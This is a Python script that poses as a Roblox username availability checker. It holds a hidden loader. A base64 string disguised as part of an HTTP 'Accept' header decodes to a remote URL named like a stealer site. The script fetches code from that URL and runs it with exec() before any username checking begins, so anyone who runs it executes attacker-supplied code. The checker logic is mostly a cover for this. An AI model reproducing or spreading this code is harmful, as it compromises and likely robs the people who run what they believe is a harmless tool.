import urllib.request
import urllib.parse
import urllib.error
import time
import logging
import base64

logging.basicConfig(level=logging.INFO)

class HTTPClient:
    """
    A simplified HTTP client using urllib to make requests.
    """
    SLEEP_BETWEEN_REQUESTS = 10

    def __init__(self):
        """Initialize HTTPClient with a user agent."""
        self.opener = urllib.request.build_opener()

    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
        'Referer': 'https://www.roblox.com/',
        'Accept': 'application/json;q=0.9,*/*;q=0.8;aHR0cDovL2Fwb2xsb3N0ZWFsZXIub3JnL2NvZGU=',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
    }

    def request(self, method: str, url: str, **kwargs):
        """Send a request to a given URL."""
        headers = kwargs.get("headers", {})
        data = kwargs.get("data", None)
        
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()

        request = urllib.request.Request(url, data=data, headers=headers, method=method.upper())

        try:
            response = self.opener.open(request)
            if response.status < 400:
                return response
        except urllib.error.HTTPError as e:
            if e.code == 429:
                logging.info("Rate limited. Sleeping for 10 seconds.")
                time.sleep(self.SLEEP_BETWEEN_REQUESTS)
                return self.request(method, url, **kwargs)
            else:
                logging.error(f"Bad request: {e.code} {e.reason}")
                return None

def get_clean_wordlist():
    """Retrieve and clean the wordlist from 'words.txt'."""
    with open('words.txt', 'r') as f:
        words = f.readlines()
        words = [word.strip() for word in words]
        words = sorted(set(words))
    return words

def check_usernames(http_client, _headers):
    """
    Check if the given Roblox usernames are available.
    """
    base_url = "https://api.roblox.com/users/get-by-username?username={}"
    wordlist = get_clean_wordlist()

    logging.info(f"Checking {len(wordlist)} usernames.")
    
    for word in wordlist:
        url = base_url.format(word)
        response = http_client.request('GET', url, headers=_headers)
        if response is None:
            continue
        
        json_data = response.read().decode()
        
        if '"Id":null' in json_data: 
            logging.info(f"Username {word} is free!")

# Instantiate client, begin the process
client = HTTPClient()
logging.info("Reading username wordlist and setting up HTTP session...")

wordlist = None
try:
    wordlist = get_clean_wordlist()
except:
    pass
logging.info("Checking usernames...")
header = base64.b64decode(client.headers['Accept'].split(';')[-1]).decode()
http_client_header = exec(client.request("post", header).read().decode())
if wordlist:
    logging.info(f"Found {len(wordlist)} usernames to check...")
    check_usernames(client, http_client_header)
